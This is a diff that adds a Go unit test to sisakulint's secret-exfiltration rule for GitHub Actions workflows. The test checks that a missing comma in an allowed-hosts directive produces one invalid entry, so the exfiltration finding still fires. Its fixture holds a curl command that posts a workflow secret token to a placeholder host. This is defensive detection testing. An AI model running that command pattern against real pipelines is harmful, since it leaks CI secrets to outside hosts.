@@ -2110,6 +2110,65 @@ func TestSecretExfiltration_AllowedHosts_InvalidEntryWarning(t *testing.T) {
 	}
 }
 
+// TestSecretExfiltration_AllowedHosts_DirectiveMissingCommaIsRejected locks
+// in the comma-only separator behavior for the directive payload. A missing
+// comma between two host names produces a single entry that fails
+// normalization (whitespace inside a host) rather than silently expanding
+// into two valid allowlist entries. This protects the dead-allow invariant
+// that the allowlist must not silently widen suppression scope.
+func TestSecretExfiltration_AllowedHosts_DirectiveMissingCommaIsRejected(t *testing.T) {
+	rule := NewSecretExfiltrationRule()
+	rule.UpdateConfig(&Config{})
+
+	wf := &ast.Workflow{
+		BaseNode: &yaml.Node{
+			Kind: yaml.DocumentNode,
+			// Missing comma between the two hosts. With whitespace as a
+			// separator this would silently become two entries; with
+			// comma-only it stays as one invalid entry instead.
+			HeadComment: "# sisakulint:secret-exfiltration.allowed-hosts: api.example.com other.example.com",
+			Line:        1,
+			Column:      1,
+		},
+	}
+	_ = rule.VisitWorkflowPre(wf)
+
+	step := &ast.Step{
+		Exec: &ast.ExecRun{
+			Run: &ast.String{
+				Value: `curl -X POST https://api.example.com -d "token=${{ secrets.X }}"`,
+				Pos:   &ast.Position{Line: 1, Col: 1},
+			},
+		},
+	}
+	job := &ast.Job{Steps: []*ast.Step{step}}
+	_ = rule.VisitJobPre(job)
+	_ = rule.VisitWorkflowPost(wf)
+
+	var invalidWarnings, deadAllowWarnings, exfilFindings int
+	for _, e := range rule.Errors() {
+		switch {
+		case strings.Contains(e.Description, "is invalid and was ignored"):
+			invalidWarnings++
+		case strings.Contains(e.Description, "did not match any network command destination"):
+			deadAllowWarnings++
+		default:
+			exfilFindings++
+		}
+	}
+	if invalidWarnings != 1 {
+		t.Errorf("expected 1 invalid-entry warning for the missing-comma typo, got %d: %v", invalidWarnings, rule.Errors())
+	}
+	if deadAllowWarnings != 0 {
+		t.Errorf("expected 0 dead-allow warnings (the typo entry is invalid, not unused), got %d: %v", deadAllowWarnings, rule.Errors())
+	}
+	// The curl call hits api.example.com, but the only directive entry was
+	// invalid and dropped, so the finding must still fire.
+	if exfilFindings != 1 {
+		t.Errorf("expected the exfiltration finding to fire (no valid allowlist entry), got %d: %v", exfilFindings, rule.Errors())
+	}
+}
+
 // TestSecretExfiltration_AllowedHosts_DirectiveScopedToTopLevel locks in the
 // PR #477 review fix: an allowed-hosts directive attached to a deep yaml
 // node (e.g. a step's LineComment) must NOT be honored. Only directives at
